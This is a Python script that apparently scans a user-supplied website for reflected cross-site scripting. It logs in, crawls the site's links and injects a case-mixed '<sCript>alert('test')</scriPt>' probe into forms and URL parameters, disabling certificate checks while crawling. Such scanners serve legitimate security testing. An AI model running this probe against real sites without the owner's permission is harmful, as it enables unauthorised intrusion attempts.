#!/usr/bin/env python3

import requests
import re
import urllib.parse as urlparse
from bs4 import BeautifulSoup
from colorama import Fore
#RegEx can be used to check if a string contains the specified search pattern
#Make a request to a web page, and print the response text
#Beautiful Soup is a library that makes it easy to grab information from web pages
#Colorama for color

print(
"\n_   _  _  _ _   __  _ ___ ___  __  __ _ _   _ _______   __    __   ___ __  __  _ __  _ ___ ___"  
"\n| \ / || || | | |  \| | __| _ \/  \|  \ | | | |_   _\ `v' /  /' _/ / _//  \|  \| |  \| | __| _ \ " 
"\n`\ V /'| \/ | |_| | ' | _|| v / /\ | -< | |_| | | |  `. .'  `._`.| \_| /\ | | ' | | ' | _|| v /" 
"\n__\_/   \__/|___|_|\__|___|_|_\_||_|__/_|___|_| |_|   !_!   |___/ \__/_||_|_|\__|_|\__|___|_|_\ \n\n"
)


target_url = input(f"{Fore.WHITE}\nEnter Website To Exploit >>> ")
links_to_ignore = [target_url+"logout.php"]

data_dict = {"username": input("\n\nIf You Have Username Then Type Here Or Enter:"), "password": input("\n\nIf You Have Password Then Type Here Or Enter:\n\n"), "Login": "submit"}

class Scanner:
    def __init__(self, url, ignore_links):
        self.session = requests.Session()
        self.target_url = url
        self.target_links = []
        self.links_to_ignore = ignore_links

    def extract_links_from(self, url):
        response = self.session.get(url, verify=False)
        return re.findall('(?:href=")(.*?)"', response.content.decode(errors="ignore"))

    def crawl(self, url=None):
        if url == None:
            url = self.target_url
        href_links = self.extract_links_from(url)
        for link in href_links:
            link = urlparse.urljoin(url, link)

            if "#" in link:
                link = link.split("#")[0]

            if self.target_url in link and link not in self.target_links and link not in self.links_to_ignore:
                self.target_links.append(link)
                print(link)
                self.crawl(link)

    def extract_forms(self, url):
        response = self.session.get(url)
        parsed_html = BeautifulSoup(response.content, features="html.parser")
        return parsed_html.findAll("form")

    def submit_form(self, form, value, url):
        action = form.get("action")
        post_url = urlparse.urljoin(url, action)
        method = form.get("method")                         #This function extracts all possible useful information about an HTML `form`

        input_list = form.findAll("input")
        post_data = {}
        for input in input_list:
            input_name = input.get("name")
            input_type = input.get("type")
            input_value = input.get("value")
            if input_type == "text":
                input_value = value

            post_data[input_name] = input_value
        if method == "post":
            return self.session.post(post_url, data=post_data)
        return self.session.get(post_url, params=post_data)

    def run_scanner(self):
        #Given a `url`, it prints all XSS vulnerable forms and returns True if any is vulnerable, False otherwise
        for link in self.target_links:
            forms = self.extract_forms(link)
            for form in forms:
                print(f"{Fore.GREEN}\n[+] Testing form in "+ link)
                is_vulnerable_to_xss = self.test_xss_in_form(form, link)
                if is_vulnerable_to_xss:
                    print(f"{Fore.RED}\n\n[+++] XSS Discovered in " + link + "  The Following Form\n")
                    print(form)

            if "=" in link:
                print(f"{Fore.GREEN}\n[+] Testing link in " + link)
                is_vulnerable_to_xss = self.test_xss_in_link(link)
                if is_vulnerable_to_xss:
                    print(f"{Fore.RED}\n\n[*****] Dsicovered xss in " + link + " The Following link")

    def test_xss_in_link(self, url):
        #Run On Link
        xss_test_script = "<sCript>alert('test')</scriPt>"
        url = url.replace("=", "=" + xss_test_script)
        response = self.session.get(url)
        return xss_test_script.encode() in response.content

    def test_xss_in_form(self, form, url):
        #Run On Forms
        xss_test_script = "<sCript>alert('test')</scriPt>"
        response = self.submit_form(form, xss_test_script, url)
        return xss_test_script.encode() in response.content

vuln_scanner = Scanner(target_url, links_to_ignore)
vuln_scanner.session.post(target_url+"login.php", data=data_dict)

vuln_scanner.crawl()
vuln_scanner.run_scanner()
